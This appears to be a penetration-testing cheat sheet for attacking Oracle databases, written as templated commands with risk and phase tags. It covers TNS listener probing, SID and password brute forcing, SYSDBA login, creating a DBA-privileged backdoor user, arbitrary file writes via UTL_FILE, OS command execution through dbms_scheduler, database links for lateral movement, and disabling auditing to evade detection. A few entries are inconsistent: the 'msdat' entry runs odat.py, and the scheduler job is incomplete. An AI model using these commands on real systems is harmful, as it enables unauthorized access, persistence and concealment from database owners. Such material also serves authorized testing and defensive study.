# Oracle
> Oracle database and TNS listener enumeration and exploitation
<!-- tags: oracle,database,tns,sid,enumeration,exploit -->

---

## TNS Listener Version Probe
Get TNS listener version with tnscmd10g.

```bash
tnscmd10g version -h {{TARGET:ip}} -p {{PORT:port:1521}}
```

<!-- meta: risk=safe | phase=recon | tags=oracle,tns,version -->

---

## TNS Listener Status
Check TNS listener status (poisoning indicator).

```bash
tnscmd10g -h {{TARGET:ip}} -p {{PORT:port:1521}} status
```

<!-- meta: risk=safe | phase=recon | tags=oracle,tns,status -->

---

## SID Brute Force with odat
Brute force Oracle Service Identifier using odat.

```bash
odat sidguesser -s {{TARGET:ip}} -p {{PORT:port:1521}}
```

<!-- meta: risk=med | phase=enum | tags=oracle,sid,bruteforce -->

---

## Connect with sqlplus
Connect to Oracle using SQL*Plus client.

```bash
sqlplus {{USERNAME:str}}/{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:1521}}/{{SERVICE_NAME:str}}
```

<!-- meta: risk=low | phase=enum | tags=oracle,sqlplus,connect -->

---

## Connect as SYSDBA
Connect with full administrative privileges (requires sys credentials).

```sql
CONNECT sys/{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:1521}}/{{SERVICE_NAME:str}} AS SYSDBA;
```

<!-- meta: risk=high | phase=exploit | tags=oracle,sysdba,privesc -->

---

## Brute Force Oracle Passwords
Hydra brute force against Oracle SID.

```bash
hydra -L {{USERS_FILE:file:users.txt}} -P {{PASSWORDS_FILE:file:passwords.txt}} {{TARGET:ip}} oracle-sid
```

<!-- meta: risk=high | phase=passwords | tags=oracle,bruteforce,hydra -->

---

## Get Oracle Version
Identify Oracle DB version for CVE matching.

```sql
SELECT * FROM v$version;
```

<!-- meta: risk=safe | phase=enum | tags=oracle,version -->

---

## List All Users and Roles
Enumerate users and their granted roles.

```sql
SELECT * FROM all_users;
SELECT username, granted_role FROM dba_role_privs;
```

<!-- meta: risk=safe | phase=enum | tags=oracle,users,roles -->

---

## List All Tables
Enumerate accessible tables.

```sql
SELECT table_name FROM all_tables;
```

<!-- meta: risk=safe | phase=enum | tags=oracle,tables -->

---

## Describe Table
Show columns and types of a specific table.

```sql
DESC {{TABLE:str}};
```

<!-- meta: risk=safe | phase=enum | tags=oracle,schema -->

---

## Find Public Privileges (Misconfigs)
Identify tables granted to PUBLIC role.

```sql
SELECT table_name, privilege FROM all_tab_privs WHERE grantee = 'PUBLIC';
```

<!-- meta: risk=safe | phase=enum | tags=oracle,public,misconfig -->

---

## Find Vulnerable PL/SQL Packages
Identify UTL_FILE / UTL_HTTP packages for exploitation.

```sql
SELECT owner, object_name FROM all_objects WHERE object_type = 'PACKAGE' AND object_name LIKE 'UTL%';
```

<!-- meta: risk=safe | phase=enum | tags=oracle,plsql,packages -->

---

## Create Privileged User Backdoor
Create user with DBA role for persistent access.

```sql
CREATE USER {{USERNAME:str:hacker}} IDENTIFIED BY {{PASSWORD:str:Pwn3d!}};
GRANT DBA TO {{USERNAME:str:hacker}};
```

<!-- meta: risk=critical | phase=post | tags=oracle,backdoor,dba -->

---

## File Write via UTL_FILE
Write arbitrary file using UTL_FILE PL/SQL package.

```sql
DECLARE v_file UTL_FILE.FILE_TYPE; BEGIN v_file := UTL_FILE.FOPEN('/tmp', 'pwn.txt', 'W'); UTL_FILE.PUT_LINE(v_file, 'pwned'); UTL_FILE.FCLOSE(v_file); END;
```

<!-- meta: risk=high | phase=exploit | tags=oracle,file-write,utl_file -->

---

## OS Command Execution via dbms_scheduler
Run shell commands through Oracle scheduler job.

```sql
EXEC dbms_scheduler.create_job(job_name => 'pwn_job', job_type => 'EXECUTABLE', job_action => '/bin/bash', enabled => TRUE);
```

<!-- meta: risk=critical | phase=exploit | tags=oracle,rce,scheduler -->

---

## Create Database Link for Lateral Movement
Establish DB link to remote Oracle instance.

```sql
CREATE DATABASE LINK {{LINK_NAME:str:remote_link}} CONNECT TO {{USERNAME:str}} IDENTIFIED BY {{PASSWORD:str}} USING '{{HOST:str}}:{{PORT:port:1521}}/{{SERVICE_NAME:str}}';
```

<!-- meta: risk=high | phase=post | tags=oracle,db-link,lateral -->

---

## Disable Auditing
Turn off auditing to evade detection.

```sql
NOAUDIT ALL;
```

<!-- meta: risk=high | phase=post | tags=oracle,evasion,audit -->

---

## msdat - Comprehensive Enumeration
Use msdat to enumerate everything on MSSQL/Oracle (multi-module).

```bash
python3 odat.py all -s {{TARGET:ip}} -d {{SERVICE_NAME:str}} -U {{USERNAME:str}} -P {{PASSWORD:str}}
```

<!-- meta: risk=med | phase=enum | tags=oracle,odat,enum -->
